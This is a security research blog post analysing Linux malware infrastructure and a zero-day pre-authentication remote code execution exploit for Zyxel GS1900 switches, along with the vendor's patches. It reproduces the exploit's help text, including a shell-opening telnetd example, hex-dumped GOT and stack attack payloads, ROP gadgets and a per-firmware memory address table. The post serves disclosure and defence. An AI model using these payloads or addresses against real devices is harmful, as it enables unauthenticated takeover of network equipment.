# Pre-Auth RCE in Zyxel GS1900 Exploited in the Wild as a Zero-Day
# (page <title>: "New Zyxel GS1900 pre-auth RCE vulnerability revealed | Binarly"; published 2026-11-03T05:22:44Z; authors Fernando Mercês, Yegor Vasilenko; URL https://www.binarly.io/blog/zyxel-gs1900-rce-cve-2026-107441)
# Rendered by decoding the page's embedded Next.js RSC payload (TipTap JSON document) in the raw HTML saved as fu3-B-binarly-extract.md; no summariser or reader involved. Images are not rendered.

### Introduction
When [Acronis TRU revealed](https://www.acronis.com/en/tru/posts/red-heron-exploits-gitea-n-day-flaw-in-multinational-campaign-exposing-new-linux-rootkit) that a threat actor was exploiting Gitea instances and dropping a new Linux rootkit into the victim's machines, the Binarly research team wanted to take a look at the malware involved, mainly to provide proper detection to [Binarly Transparency Platform (BTP)](https://www.binarly.io/features) customers. During our investigation, we found that the malware C&C server was hosting files related to other attacks as well. Among these files, there was an exploit to a Zyxel pre-auth RCE vulnerability, which we began looking into.
In the meantime, GreyNoise [published a blog post](https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation) detailing similar findings tying the exploit to CVE-2026-7273. Therefore in this article, we will focus on what we found in addition to these publications to avoid overlap. This includes samples of JITTERLY and SIXZUT malware, which differs from those analyzed by Acronis TRU and, more importantly, an inconsistency between Zyxel patch for CVE-2026-7273 and the vulnerability targeted by the exploit, which turned out to be a recently confirmed zero-day, assigned **CVE-2026-107441**.

### JITTERLY and SIXZUT malware
JITTERLY is a backdoor that decrypts its configuration containing the C&C server address and port from an embedded AES-encrypted blob. The decrypted configuration is in [MessagePack](https://en.wikipedia.org/wiki/MessagePack) format. Since this malware has previously been analyzed by both Acronis TRU and an [independent researcher](https://dmpdump.github.io/posts/Unattributed_Linux_Implant/), we will give just a few details about its configuration decryption routines and the dropped SIXZUT rootkit. This will help to build the context of our research.
Recent JITTERLY samples contain two AES-encrypted blobs: its configuration encrypted with AES-GSM and ring 3 rootkit known as SIXZUT, which is encrypted with AES-CTR.
The following is a summary of what we found:
| JITTERLY SHA-256 | Configuration decryption | C&C server | AES-CTR key to decrypt SIXZUT | Embedded rootkit (SIXZUT) SHA-256 |
| 82d072ab03d90c0131b06a576eadf2c986a51f0de986d50db4e49be01bf125cb | AES-GCM key:
55B548ED01A1AE2E1AA80804E8AD7822 
 IV: A70BF73B322FF846E323E3A2 
 GCM tag:
415D1FF075C9F4CF2D26F777586671DF | p1.981666[.]xyz:6443 | 29377927C97EC48C2FEBB8CFE79DC0DA | 295133156b6a7d95b9c92f832f49e35235f1fbd3906e75c9202ef4cd65d1018c |
| 663a8088faca8e126a11648f5671fcf4eaf96435e10daf63a1d1b17d8385154c | AES-GCM key:
406CDB0B0AA106F3C7E4FD833F849891 
 IV: 23A6472F8D43CD1A3F37DFA2 
 GCM tag:
451E4DC511FB7954D719A63654265B64 | p2.981666[.]xyz:8080 | C796E5A9759FCB17B0769D68C38C1F55 | 64677002011bc2e4bc642a4154a20fdb95620ebd0144b98fc60f917901ec8b92 |
| 0f6e757e82c4d91df5bd249f775b9970b59dee42cc0dfe40f879d77fc16821c6 


 | AES-GCM key:
A0FAC473B9F4A7863B250C7E0EC51E15 
 IV: 09CD4A385F479A729BABCB24 
 GCM tag:
6FB26E921B9550451134E7C1BC824CB7 | s2.981666[.]xyz:8082 | 7CE2FD7B3E895606B4AF1A0867F4601E | 728810b07e911b235f6450e784391e39f68819a0a5d209662162916ffea25146 |
On the rootkit side, 728810b07e911b235f6450e784391e39f68819a0a5d209662162916ffea25146 shares the same code as the sample Acronis TRU analyzed (28B132AD55BD310BB5CF3DDB4ACE580529AD735204A48CF388830D9039843D8E), which we did not have access to. The only difference is that the sample we found actually contains an encrypted configuration: It hides processes named “configd” and connections to the same C&C server used by its dropper sample (s2.981666[.]xyz:8082).
As the table above shows, the threat actor consistently used the 981666[.]xyz domain, only varying hostname, port, and AES keys to decrypt it. This led us to investigate what else this domain could be hiding.
Based on the hostnames used by the malware, we accessed some of them and brute forced others. The following table summarize what we found:
| **Hostname** | **Resolved IPv4 address** | **Services** |
| p1.981666[.]xyz | 127.0.0.1 | 
 |
| p2.981666[.]xyz | 104.223.65[.]148 | JITTERLY C&C at 8080/tcp; web servers with open directories at 80 and 18081/tcp |
| p3.981666[.]xyz | 127.0.0.1 | 
 |
| s0.981666[.]xyz | 203.88.123[.]148 | Admin panel with [SoybeanAdmin](https://github.com/soybeanjs/soybean-admin) web UI at 80/tcp;  OpenSSH server at 22/tcp |
| s1.981666[.]xyz | 203.88.123[.]148 | 
 |
| s2.981666[.]xyz | 104.225.153[.]141 | JITTERLY C&C at 5432, 6379, and 8082/tcp; web server with HTTP authorization on 8092/tcp; Nginx on 8833/tcp |
| s3.981666[.]xyz | 104.225.153[.]141 | 
 |
| s4.981666[.]xyz | 104.225.153[.]141 | 
 |
| s5.981666[.]xyz | 104.225.153[.]141 | 
 |
| s6.981666[.]xyz | 104.225.153[.]141 | 
 |
| s7.981666[.]xyz | 166.88.227[.]181 | JITTERLY C&C at 443/tcp |
| s8.981666[.]xyz | 104.225.153[.]141 | 
 |
| s9.981666[.]xyz | 104.225.153[.]141 | 
 |
We checked all hostnames and services. The most interesting finding came from the open directory in p2.981666[.]xyz on port 18081, where we saw a file named `gs1900_bundle.tar.gz` that caught our attention.

### Zyxel GS1900 pre-auth RCE exploit
The `gs1900_bundle.tar.gz` file we obtained contained a protected `exp.py` alongside a [PyAmor](https://github.com/dashingsoft/pyarmor) runtime library and some compiled bytecode from previous executions:
```c
./exp.py
./pytransform/__pycache__/__init__.cpython-312.pyc
./pytransform/__pycache__/__init__.cpython-310.pyc
./pytransform/__init__.py
./pytransform/_pytransform.so
```
`exp.py` was unsurprisingly obfuscated:
```c
#!/usr/bin/env python3
from pytransform import pyarmor_runtime
pyarmor_runtime()
__pyarmor__(__name__, __file__, b'\x50\x59\x41\x52…')
```
But it could run under the right Python version:
```c
$ uv run --python 3.10 exp.py -h
usage: exp.py [-h] [-m {got,stack,auto}] [-n ATTEMPTS] [--libc LIBC] [--req-params REQ_PARAMS] [--strcmp-got STRCMP_GOT] [--system-off SYSTEM_OFF]
              [--no-fingerprint]
              url command
Zyxel GS1900 Pre-Auth RCE
positional arguments:
  url                   target URL (http://ip or https://ip:port)
  command               command to execute
options:
  -h, --help            show this help message and exit
  -m {got,stack,auto}, --mode {got,stack,auto}
                        got=deterministic, stack=ASLR brute-force, auto=fingerprint then decide
  -n ATTEMPTS, --attempts ATTEMPTS
                        max attempts for stack mode (default: 10000)
  --libc LIBC           libc base address override
  --req-params REQ_PARAMS
                        reqParameters address override
  --strcmp-got STRCMP_GOT
                        strcmp GOT address override
  --system-off SYSTEM_OFF
                        system() offset in libc override
  --no-fingerprint
Examples:
  exp.py http://192.168.1.1 'echo rce>/tmp/pwned'
  exp.py https://192.168.1.1 '/bin/busybox telnetd -p 2323 -l /bin/sh'
  exp.py http://192.168.1.1 -m stack -n 5000 'id>/tmp/id'
Notes:
  Command must not contain: & (0x26), = (0x3D), newline, null byte.
  GOT mode is deterministic (1 request). Stack mode is ASLR brute-force (~2048 avg).
```
As the help message suggests, the exploit has two operation modes: Global Offset Table (GOT) and stack. Also, it requires some information from the target, such as the libc base address in memory, `reqParameters` address (a global variable in `dispatcher.cgi`; that we will cover soon), the address of `strcmp` in the GOT, and the offset of `system` from the libc base address. It targets `/cgi-bin/dispatcher.cgi` in Zyxel GS1900 series network switches, which has MIPS CPUs. 
To understand how the exploit works, let’s take a look first at the vulnerability it exploits, starting with the Zyxel firmware version 2.90(AAHH.1)C0 released on March 25, 2025.

### GS1900’s dispatcher.cgi
This CGI program handles HTTP POST requests sent to the device’s [Boa webserver](http://www.boa.org/). At the beginning of its `main`, it calls a `web_util_initParaPairs` function:
```c
int main(int argc, const char **argv, const char **envp)
{
  // …
   _DWORD s[46]; // [sp+470h] [-20C8h] BYREF
  // …
  web_util_initParaPairs();
  puts(
    s: "Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-inline' 'unsafe-eval';style-src 'self' 'unsafe"
    "-inline'; base-uri 'self'");
  v5 = getenv(name: "ACCESS_TYPE");
  v6 = web_util_paramVal_ret(s2: "_err");
  // …
}
```
`web_util_initParaPairs` has a loop to parse the request body:
```c
for ( pos = strchr(src, '&'); pos != nullptr; pos = strchr(pos + 1, '&') )
{
  dest = &reqParameters[1024 * count];
  memcpy(dest, src, pos - src);
  dest[pos - src] = 0;
  v10 = strchr(dest, '=');
  if ( v10 != nullptr )
  {
    if ( v10[1] == '&' )
      dest[512] = 0;
    else
      urlDecode(dest + 512, v10 + 1);
    *v10 = 0;
  }
  src = pos + 1;
  ++count;
}
```
Now consider the following:
- `src` contains the full request body (e.g., “param1=value1&param2=value2…”).
- `reqParameters` is a global buffer (stored in `.bss` section) that can hold up to 0x23000 bytes.
- `count` is a global variable from signed int type (32-bytes in MIPS architecture).
For every `‘&’` character found in the request body (`src` variable), the loop copies what is before this character to `reqParameters[1024 * count]`, which is pointed by `dest`. It expects every `key=value` pair to have up to 1024 bytes, but **it does not check its size**, which makes it easy for an attacker to overflow the `reqParameters` global buffer.
Another missing check is against `count`. This global variable is supposed to store the number of parameters parsed, but it is **never checked**. Because the content of parameters and their count are both attacker-controlled, an attacker can send a crafted request that will cause a memory corruption bug and allow writing to a wide address range within the process memory.
Once the loop is finished, there is a block that handles the last parameter (not `‘&’`-terminated) sent. The block reuses `count`, which in normal conditions would have the number of parameters previously processed by the loop block:
```c
if ( -src < strlen(src) )
{
  dest = &reqParameters[1024 * count];
  len = strlen(src);
  memcpy(dest, src, len);
  dest[strlen(src)] = 0;
  v14 = strchr(dest, '=');
  if ( v14 != nullptr )
  {
    v16 = v14 + 1;
    v17 = strlen(v14 + 1);
    memcpy(dest + 512, v16, v17);
    *v14 = 0;
  }
  ++count;
}
```

### How the exploit works
The recovered exploit has two modes: GOT and stack. We deobfuscated it and verified that to decide which mode to use, the exploit first fingerprints the device to identify the firmware version running. It also contains a list of memory addresses of the `reqParameters` variable, `strcmp` address in the GOT, libc base, and offset of `system` from libc in known vulnerable firmware versions, so whoever fires the exploit does not always need to provide this information.

#### GOT mode
In this mode, the exploit tries to replace the address of `strcmp` with the address of `system` within the process GOT. Here’s an example of a payload sent:
```c
00000000  50 4f 53 54 20 2f 63 67  69 2d 62 69 6e 2f 64 69  |POST /cgi-bin/di|
00000010  73 70 61 74 63 68 65 72  2e 63 67 69 20 48 54 54  |spatcher.cgi HTT|
00000020  50 2f 31 2e 30 0d 0a 48  6f 73 74 3a 20 31 32 37  |P/1.0..Host: 127|
00000030  2e 30 2e 30 2e 31 0d 0a  43 6f 6e 74 65 6e 74 2d  |.0.0.1..Content-|
00000040  54 79 70 65 3a 20 61 70  70 6c 69 63 61 74 69 6f  |Type: applicatio|
00000050  6e 2f 78 2d 77 77 77 2d  66 6f 72 6d 2d 75 72 6c  |n/x-www-form-url|
00000060  65 6e 63 6f 64 65 64 0d  0a 43 6f 6e 6e 65 63 74  |encoded..Connect|
00000070  69 6f 6e 3a 20 63 6c 6f  73 65 0d 0a 43 6f 6e 74  |ion: close..Cont|
00000080  65 6e 74 2d 4c 65 6e 67  74 68 3a 20 31 31 37 34  |ent-Length: 1174|
00000090  0d 0a 0d 0a 69 64 26 26  26 26 26 26 26 26 26 26  |....id&&&&&&&&&&|
000000a0  26 26 26 26 26 26 26 26  26 26 26 26 26 26 26 26  |&&&&&&&&&&&&&&&&|
…
00000120  26 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |&BBBBBBBBBBBBBBB|
00000130  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |BBBBBBBBBBBBBBBB|
…
00000520  42 01 3b ff ff 26 44 44  54 44                    |B.;..&DDTD|
0000052a
```
In the above example, the request body structure is as follows:
| command to execute | ‘&’ * 139 | ‘B’ * 1024 | 32-bit number | ‘&’ | system() address |
During the first iteration of the loop, the first parameter is copied to `reqParameters[1024 * 0]`. In the payload sent, the first parameter is actually the command to execute (`id` in the example). Then the loop tries to find a `‘&’` character and continues to process the remaining parameters, which are empty in this case.
The trick is in the processing of the 140th parameter, when `count == 139`. If we divide the amount of bytes `reqParameters` can hold by 1024, we get 140, which is the maximum expected number of parameters (0x23000 / 1024 == 140). However, when parsing the 140th parameter,  `web_util_initParaPairs` copies 1024 ‘B’ characters to the last slot at `reqParameters[1024 * 139]`, but because the parameter maximum size is not checked, it also copies the 32-bit number past the `reqParameters` address. What’s in there is exactly `count`, so **this effectively overwrites **`count`** with the 32-bit number sent**. Looking at the `.bss` section in IDA, we see the two variables are adjacent:
```c
.bss:10003BC0 ?? ?? ?? ?? reqParameters:  .space 0x23000           # DATA XREF: LOAD:00409538↑o
.bss:10003BC0 ?? ?? ?? ??…                                         # web_util_paramVal_ret+2C↑o ...
.bss:10026BC0 ?? ?? ?? ?? count:          .space 4                 # DATA XREF: web_util_paramVal_ret+38↑r
```
By the time the 141th parameter containing the `system` address is processed by the out-of-loop block, `count` is already corrupted. In the example, it would contain the value 0x013bffff that gets multiplied by 1024 causing a signed integer overflow and it’s treated as a negative number, so `dest` will point to an address **before** `reqParameters` address. Before sending this number, the exploit calculates the right amount to hit an address within the GOT:
[image] {"src": "https://res.cloudinary.com/dlnhqmgqi/image/upload/v1793683607/blog/pre-auth-rce-in-zyxel-gs1900-exploited-in-the-wild-as-a-zero-day-figure-1_v42t6r.png", "alt": null, "title": null, "width": 
From this point on, the next time the program calls `strcmp`, it will actually call `system`. This happens quickly after `web_util_initParaPairs` is finished and `main` calls `web_util_paramVal_ret` for the first time:
```c
char *web_util_paramVal_ret(char *param)
{
  int v2; // $s0
  const char *reqParams; // $s2
  int v4; // $v0
  int v5; // $s1
  v2 = 0;
  if ( count <= 0 )
    return nullptr;
  reqParams = reqParameters;
  while ( 1 )
  {
    v4 = strcmp(reqParams, param);
    v5 = v2 << 10;
    reqParams += 1024;
    ++v2;
    if ( v4 == 0 )
      break;
    if ( v2 >= count )
      return nullptr;
  }
  return &unk_10003DC0 + v5;
}
```
Because the first parameter previously copied to `reqParams[1024 * 0]` is the command to execute, a call to `system(“id”)` happens, honoring the unauthenticated remote code execution nature of this vulnerability.

#### Stack mode
The same out-of-bounds write vulnerability is exploited in this mode. However, instead of overwriting the GOT, the exploit targets saved registers on stack to execute code via [return-oriented programming (ROP)](https://en.wikipedia.org/wiki/Return-oriented_programming). Here’s a sample payload:
```c
00000000  50 4f 53 54 20 2f 63 67  69 2d 62 69 6e 2f 64 69  |POST /cgi-bin/di|
00000010  73 70 61 74 63 68 65 72  2e 63 67 69 20 48 54 54  |spatcher.cgi HTT|
00000020  50 2f 31 2e 30 0d 0a 48  6f 73 74 3a 20 6c 6f 63  |P/1.0..Host: loc|
00000030  61 6c 68 6f 73 74 0d 0a  43 6f 6e 74 65 6e 74 2d  |alhost..Content-|
00000040  54 79 70 65 3a 20 61 70  70 6c 69 63 61 74 69 6f  |Type: applicatio|
00000050  6e 2f 78 2d 77 77 77 2d  66 6f 72 6d 2d 75 72 6c  |n/x-www-form-url|
00000060  65 6e 63 6f 64 65 64 0d  0a 43 6f 6e 6e 65 63 74  |encoded..Connect|
00000070  69 6f 6e 3a 20 63 6c 6f  73 65 0d 0a 43 6f 6e 74  |ion: close..Cont|
00000080  65 6e 74 2d 4c 65 6e 67  74 68 3a 20 31 35 39 34  |ent-Length: 1594|
00000090  0d 0a 0d 0a 6c 6f 67 69  6e 5f 63 68 6b 3d 31 26  |....login_chk=1&|
000000a0  26 26 26 26 26 26 26 26  26 26 26 26 26 26 26 26  |&&&&&&&&&&&&&&&&|
…
00000110  26 26 26 26 26 26 26 26  26 26 26 26 26 26 26 69  |&&&&&&&&&&&&&&&i|
00000120  64 20 3b 23 26 26 26 26  26 26 26 26 26 26 26 42  |d ;#&&&&&&&&&&&B|
00000130  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |BBBBBBBBBBBBBBBB|
…
00000520  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 01  |BBBBBBBBBBBBBBB.|
00000530  1b ff c3 26 31 31 31 31  31 31 31 31 31 31 31 31  |...&111111111111|
00000540  31 31 31 31 31 31 31 31  31 31 31 31 31 31 31 31  |1111111111111111|
…
000006a0  31 31 31 31 31 31 31 31  31 31 31 31 30 30 30 30  |1111111111110000|
000006b0  2b 18 c6 50 32 32 32 32  33 33 33 33 34 34 34 34  |+..P222233334444|
000006c0  35 35 35 35 2b 16 e3 98  3d 69 64 20 3b 23        |5555+...=id ;#|
```
The layout is as follows:
| login_chk=1 | ‘&’ * 128 | command to execute | ‘&’ * 11 | ‘&’ * 1024 | counter | ‘&’ | ‘1’ * padding | registers | ‘=’ | command to execute followed by “;#” |
Registers contains the following sequence:
| s0 | s1 | s2 | s3 | s4 | s5 | ra |
| “0000” | system() offset | “2222” | “3333” | “4444” | “5555” | gadget offset |
Parameter zero, `login_chk=1`, is copied to `reqParameters[1024 * 0]`. Parameter 128 contains the shell command to execute. Parameter 139 (the 140th one) fills the 1024 byte limit, then `count` is overwritten with `counter` (011bffc3 in this sample payload), which reaches the function stack. The out-of-loop block processes the last parameter, which is the left-padded key containing values for registers and its value is again the command to execute.
At the beginning of the code block, the `&reqParameters[1024 * count]` calculation is performed by the following instructions:
```c
.text:004180AC    la      $v0, reqParameters       # v0 = reqParameters
.text:004180B0    lui     $v1, 2                   # v1 = 0x2000 (1024 * 128)
.text:004180B4    addu    $a0, $v0, $v1            # a0 = &reqParameters[128]
```
This leaves the `a0` register pointing to the 129th parameter sent (the command to execute in the payload). Then, at the function epilogue, the callee-saved registers are restored from the corrupted stack:
```c
.text:00417E04    lw      $ra, 0x2018+var_s18($sp) # gadget offset
.text:00417E08    lw      $s5, 0x2018+var_s14($sp) # "5555"
.text:00417E0C    lw      $s4, 0x2018+var_s10($sp) # "4444"
.text:00417E10    lw      $s3, 0x2018+var_sC($sp)  # "3333"
.text:00417E14    lw      $s2, 0x2018+var_s8($sp)  # "2222"
.text:00417E18    lw      $s1, 0x2018+var_s4($sp)  # system()
.text:00417E1C    lw      $s0, 0x2018+var_s0($sp)  # "0000"
.text:00417E20    move    $v0, $zero
.text:00417E24    jr      $ra                      # jump to gadget
```
The gadget contains 0x2b16e398 in the example payload, which is an offset of the following gadget at uClibc (/lib/libuClibc-0.9.28.so):
```c
.text:0000B398    move    $t9, $s1
.text:0000B39C    jalr    $t9
.text:0000B3A0    move    $s0, $v0
```
The gadget copies `s1`, which contains the `system` function offset (from the libc base), to `t9` and calls it. The `move` instruction acts as a [delay slot](https://en.wikipedia.org/wiki/Delay_slot). This ends up executing `system(“id”)` in our example.
> All addresses shown are valid for one target in our emulated environment. They do not match the real addresses in the device. Also, the exploit we found contains hard-coded memory addresses for different firmware versions.
We also tested the exploit on real hardware. We’ll publish a minimized version of the proof-of-concept exploit in the near future.

### CVE-2026-7273 patch
On June 16, 2026, [Zyxel released](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026) the version 2.90(Axxx.2)C0 of the firmware to fix a “stack-based buffer overflow vulnerability in the CGI program of the Zyxel GS1900 series switch firmware,” which received the CVE-2026-7273 identifier.
Then on Sept. 21, [GreyNoise said in their blog post](https://web.archive.org/web/20261005015957/https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation) that CVE-2026-7273 was the vulnerability targeted by this exploit. However two things caught our attention:
1. The exploit contains configuration to target devices running the patched firmware version.
```c
VERSION_DB = {
    '10 Sep 2015' : ('2.10(AAHL.0)C0', 0x10003840, 0x10002864, 0x2b12b000, 0x294f0),
    '23 Jun 2016' : ('2.20(AAHL.0)C0', 0x10003940, 0x10002908, 0x2b1c1000, 0x294f0),
    '02 Sep 2016' : ('2.20(AAHL.1)C0', 0x10003940, 0x10002908, 0x2b1c1000, 0x294f0),
    '14 Dec 2016' : ('2.30(AAHL.0)C0', 0x10003940, 0x10002910, 0x2b1c1000, 0x294f0),
    '14 Nov 2017' : ('2.40(AAHL.0)C0', 0x10003a80, 0x100029c4, 0x2b1c1000, 0x294f0),
    '30 Mar 2018' : ('2.40(AAHL.1)C0', 0x10003a80, 0x100029c4, 0x2b1d4000, 0x294f0),
    '05 Jun 2019' : ('2.40(AAHL.2)C0', 0x10003b10, 0x10002a44, 0x2b196000, 0x294f0),
    '21 Oct 2019' : ('2.50(AAHL.0)C0', 0x10003b20, 0x10002a4c, 0x2b1d9000, 0x294f0),
    '17 Jun 2020' : ('2.60(AAHL.1)C0', 0x10003b60, 0x10002a64, 0x2b1dc000, 0x294f0),
    '22 Sep 2020' : ('2.60(AAHL.2)C0', 0x10003b60, 0x10002a64, 0x2b1dc000, 0x294f0),
    '05 Jan 2021' : ('2.60(AAHL.3)C0', 0x10003b60, 0x10002a64, 0x2b1dc000, 0x294f0),
    '24 May 2021' : ('2.60(AAHL.4)C0', 0x10003b60, 0x10002a68, 0x2b1dc000, 0x294f0),
    '22 Oct 2021' : ('2.70(AAHL.0)C0', 0x10003bc0, 0x10002a80, 0x2b1dc000, 0x294f0),
    '11 Jan 2022' : ('2.70(AAHL.1)C0', 0x10003bc0, 0x10002a7c, 0x2b1dd000, 0x294f0),
    '26 Jul 2022' : ('2.70(AAHL.3)C0', 0x10003bc0, 0x10002a7c, 0x2b1dd000, 0x29650),
    '08 Feb 2023' : ('2.70(AAHL.5)C0', 0x10003bc0, 0x10002a80, 0x2b1dd000, 0x29650),
    '16 Oct 2023' : ('2.80(AAHL.0)C0', 0x10004420, 0x100032d0, 0x2b1a5000, 0x29650),
    '08 Aug 2024' : ('2.80(AAHL.1)C0', 0x10004420, 0x100032cc, 0x2b1a5000, 0x29650),
    '24 Oct 2024' : ('2.90(AAHL.0)C0', 0x10004430, 0x100032d8, 0x2b164000, 0x29650),
    '04 Mar 2025' : ('2.90(AAHL.1)C0', 0x10004430, 0x100032d8, 0x2b163000, 0x29650),
    '07 May 2026' : ('2.90(AAHL.2)C0', 0x10004430, 0x100032d8, 0x2b163000, 0x29650),
}
```
The last line contains addresses for a firmware version 2.90(AAHL.2)C0, which is the patched firmware for Zyxel GS1900-24 switch. Its latest firmware was released on June 12, 2026, and release notes contain: “Fixed Pre-authentication buffer overflow vulnerability (CVE-2026-7273).”
1. [CVE-2026-7273 description](https://nvd.nist.gov/vuln/detail/cve-2026-7273) does not match what the exploit does. It mentions a “stack-based buffer overflow vulnerability,” but the exploit achieves arbitrary memory write via a global buffer (`.bss` section), not stack.
So, we analyzed the patch to understand exactly what it changes. Here’s what we found.
In different places, the patch replaces calls to `sprintf` with `snprintf`. Two of them are in `main`:
[image] {"src": "https://res.cloudinary.com/dlnhqmgqi/image/upload/v1793683610/blog/pre-auth-rce-in-zyxel-gs1900-exploited-in-the-wild-as-a-zero-day-figure-2_qyfihi.png", "alt": null, "title": null, "width": 
In the code shown in Figure 2, `name` is a 64-byte stack-allocated buffer. As the `authID` parameter is attacker-controlled, a specially-crafted request can indeed overflow the `name` buffer if the code uses `sprintf`, but this has little to do with what the exploit targets.
Additionally, the patch adds the following checks to `web_util_initParaPairs`:
```c
for ( pos = strchr(queries, '&'); pos != nullptr; pos = strchr(pos + 1, '&') )
{
  dest = &reqParameters[1024 * counter];
  memcpy(dest, src, pos - src);
  dest[pos - src] = 0;
  v10 = strchr(dest, '=');
  v11 = v10;
  if ( v10 != nullptr )
  {
    if ( v10[1] == '&' )
      dest[512] = 0;
    else
      urlDecode(dest + 512, v10 + 1);
    *v11 = 0;
  }
  src = pos + 1;
  if ( ++counter == 140 ) // CHECK A: return if counter == 140
    return 0;
}
if ( -queries < strlen(queries) )
{
  v13 = &reqParameters[1024 * counter];
  v12 = strlen(src);
  memcpy(v13, src, v12);
  v13[strlen(src)] = 0;
  v14 = strchr(v13, c: '=');
  v15 = v14;
  if ( v14 != nullptr )
  {
    v16 = v14 + 1;
    v17 = strlen(v14 + 1);
    memcpy(v13 + 512, v16, v17);
    *v15 = 0;
  }
  ++counter;
}
v18 = counter;
if ( counter >= 141 ) // CHECK B: resets counter to 140 if counter > 140
  v18 = 140;
counter = v18;
return 0;
```
These checks do not help against the exploit either. By the time Check A happens, `counter` is already corrupted. Thus, the equality test fails and the code proceeds to the out-of-loop if block that processes the last parameter. The `if` block then copies the 141th parameter from the malicious payload to `reqParameters[1024 * counter]`, so the latest firmware version released as a fix to CVE-2026-7273 is vulnerable to the same exploit, which works without changes.
We reported this to Zyxel and they said that the CVE-2026-7273 vulnerability was related to a `reqParameters` overflow due to a lack of counter validation, despite the vulnerability description on their website referring to a stack overflow.
Furthermore, they consider what we reported as a separate vulnerability because we also mentioned the lack of a parameter size check.

### CVE-2026-107441 patch
On Oct. 22, 2026, just a few weeks after we contacted the vendor, they [released new firmware](https://community.zyxel.com/en/discussion/34420/switch-gs1900-series-v2-90-patch-3-firmware-release) versions for the GS1900 series that include a fix for this vulnerability. The parameter parsing loop in this new version is as follows:
```c
for ( pos = strchr(queries, '&'); pos != nullptr; pos = strchr(pos + 1, '&') )
{
  dest = &reqParameters[1024 * counter];
  if ( counter >= 140 ) // the global counter is checked **before** the copy
    return 0;
  // memcpy was replaced with a wrapper function that limits
  // how many bytes are copied to the destination (2nd parameter)
  web_util_paramCopy(&reqParameters[1024 * counter], 512, src, pos - src);
  v11 = strchr(dest, '=');
  v12 = v11;
  if ( v11 != nullptr )
  {
    if ( v11[1] == '&' )
      dest[512] = 0;
    else
      urlDecode(dest + 512, v11 + 1);
    *v12 = 0;
  }
  src = pos + 1;
  ++counter;
}
```
This effectively fixes the vulnerability as the copy is now limited to 511 bytes per field and the number of parameters is checked before the parameter is copied into the global buffer.

### Conclusion
Things are moving fast in the cybersecurity space. LLMs give great power to attackers (we believe the exploit is LLM-generated), but also to defenders (we used LLMs to set up emulated environments running the impacted firmware versions). It is also worth mentioning that this exploit was tied to an existing vulnerability, CVE-2026-7273, and the United States Cybersecurity and Infrastructure Cybersecurity Agency (CISA) [published a Known Exploited Vulnerabilities (KEV) alert](https://www.cisa.gov/news-events/alerts/2026/09/21/cisa-adds-one-known-exploited-vulnerability-catalog) the same day recommending device owners to upgrade the firmware, but because the threat actor was exploiting a different vulnerability, and patch for CVE-2026-7273 remained ineffective, this had no effect on protecting devices from being exploited by this threat actor.
Cases such as this highlight the urgency for a more reliable way of checking vulnerabilities in software. Advisories and version numbers certainly help, but they cannot be blindly trusted. We truly believe the definitive way to assess whether software components contain vulnerabilities is by looking at its binary code. That’s why we created BTP and we keep improving it to address the needs of this quickly changing threat landscape.

### **Related BTP rules**
| **Rule name** | **BTP engine** |
| BRLY_2026_057 | [YaraHunt](https://docs.binarly.io/resource-center/malicious-code-detection#yarahunt) |

### **Timeline of events**
| **Date** | **Event** |
| June 16, 2026 | Zyxel publishes an advisory on CVE-2026-7273 |
| Sept. 13, 2026 | Acronis TRU publishes a blog post on a threat actor using JITTERLY malware, SIXZUT rootkit, and exploiting Gitea instances |
| Sept. 17, 2026 | Binarly starts to investigate JITTERLY/SIXZUT malware and its infrastructure and finds an exploit targeting Zyxel devices |
| Sept. 21, 2026 | GreyNoise releases a detailed blog post on the threat actor’s activities and tied their exploit to CVE-2026-7273 |
| Sept. 21, 2026 | CISA adds CVE-2026-7273 to KEV catalog |
| Sept. 28, 2026 | Binarly confirms all ten fixed releases addressing CVE-2026-7273 remain vulnerable to the exploit used by the threat actor |
| Sept. 29, 2026 | Binarly notifies Zyxel PSIRT |
| Oct. 11, 2026 | Zyxel confirms the new vulnerability and reserves CVE-2026-107441 |
| Oct. 22, 2026 | Zyxel [releases a fix](https://community.zyxel.com/en/discussion/34420/switch-gs1900-series-v2-90-patch-3-firmware-release) for CVE-2026-107441 |
| Nov. 3, 2026 | Zyxel [publishes an advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-out-of-bounds-write-vulnerability-in-gs1900-series-switches-11-03-2026) on CVE-2026-107441 |
| Nov. 3, 2026 | Binarly [publishes an advisory](https://www.binarly.io/advisories/brly-2026-057) on BRLY-2026-057/CVE-2026-107441 and this blog post |

### **Indicators of Compromise**
JITTERLY
0f6e757e82c4d91df5bd249f775b9970b59dee42cc0dfe40f879d77fc16821c6
663a8088faca8e126a11648f5671fcf4eaf96435e10daf63a1d1b17d8385154c
82d072ab03d90c0131b06a576eadf2c986a51f0de986d50db4e49be01bf125cb
SIXZUT
295133156b6a7d95b9c92f832f49e35235f1fbd3906e75c9202ef4cd65d1018c
64677002011bc2e4bc642a4154a20fdb95620ebd0144b98fc60f917901ec8b92
728810b07e911b235f6450e784391e39f68819a0a5d209662162916ffea25146

### **Firmware impacted by BRLY-2026-057/CVE-2026-107441**
| **dispatcher.cgi SHA-256** | **Latest firmware version** |
| 3aadb18305cba1d6549a5302f7a098e1d7f18b718a35afa583339ce243bdd15d | GS1900-10HP_2.90(AAZI.0)C0 GS1900-16_2.90(AAHJ.0)C0 GS1900-24_2.90(AAHL.0)C0 GS1900-24E_2.90(AAHK.0)C0 GS1900-24EP_2.90(ABTO.0)C0 GS1900-24HPv2_2.90(ABTP.0)C0 GS1900-48_2.90(AAHN.0)C0 GS1900-48HPv2_2.90(ABTQ.0)C0 GS1900-8_2.90(AAHH.0)C0 GS1900-8HP_2.90(AAHI.0)C0 |
